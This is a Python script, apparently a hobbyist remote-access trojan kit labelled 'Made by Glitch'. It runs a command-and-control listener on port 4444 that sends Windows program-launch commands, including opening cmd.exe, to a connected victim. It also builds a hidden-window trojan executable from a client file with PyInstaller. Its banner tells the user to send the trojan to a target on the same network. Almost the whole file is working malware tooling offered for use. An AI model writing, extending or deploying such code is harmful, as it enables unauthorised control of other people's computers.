import socket
import PyInstaller.__main__






def server_starter():
    

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('0.0.0.0', 4444))
    s.listen(1)

    print('Waiting for connections...')

    c, addr = s.accept()

    print('')

    print(f'Connected to you is {addr}')

    


    try:
        while True:
            print('')

            print('Supported commands: cmd, calc, browser, pad')
            inp = input('Enter Command: ').strip().lower()

            if inp == 'cmd':
                try:
                    c.send(b'start cmd.exe')
                    print('Command sent successfully!')
                    print('')
                except Exception as e:
                    print(f'Could not send command: {e}')
            elif inp == 'pad':
                try:
                    c.send(b'start notepad.exe')
                    print('Command sent successfully!')
                    print('')
                except Exception as e:
                    print(f'Could not send command: {e}')
            elif inp == 'calc':
                try:
                    c.send(b'start calc.exe')
                    print('Command sent successfully!')
                    print('')
                except Exception as e:
                    print(f'Could not send command: {e}')
            elif inp == 'browser':
                try:
                    c.send(b'start msedge.exe')
                    print('Command sent successfully!')
                    print('')
                except Exception as e:
                    print(f'Could not send command: {e}')
            elif inp == 'exit':
                print("Connection remains. Only stop typing. Ctrl + C to exit")

                break
    except KeyboardInterrupt:
        print('Exiting...')
    
    finally:
        c.close()
        s.close()

def create_trojan():
    try:
        PyInstaller.__main__.run([
                '--onefile',
                '--windowed',
                '--distpath=Created_trojans',
                'client.py'
        ])
    except ModuleNotFoundError:
        print('There is no Module named pyinstaller')
        print('Install it via pip: pip install pyinstaller')
        exit()







def start():
    print(''' 
     _  _
    (o)(o)--.
     \../ (  )hjw
     m\/m--m'`--.     
''')
    
    print('Made by Glitch')
    print('v. 1.0.0')
    print('='*30)
    print('!!! Please create the trojan first then send the \n trojan to the targe and the start then server and wait for connections \n the target should be in the same network as you!!!')
    print('''
    1). Start Server
    2). Create Trojan
    
    99). exit

''')
   
    print('')      
    inp2 = input('Enter command: ')
    print('')

    if inp2 == '1':
        server_starter()
    elif inp2 == '2':
        create_trojan()
    elif inp2 == '99':
        exit()


if __name__ == '__main__':
    start()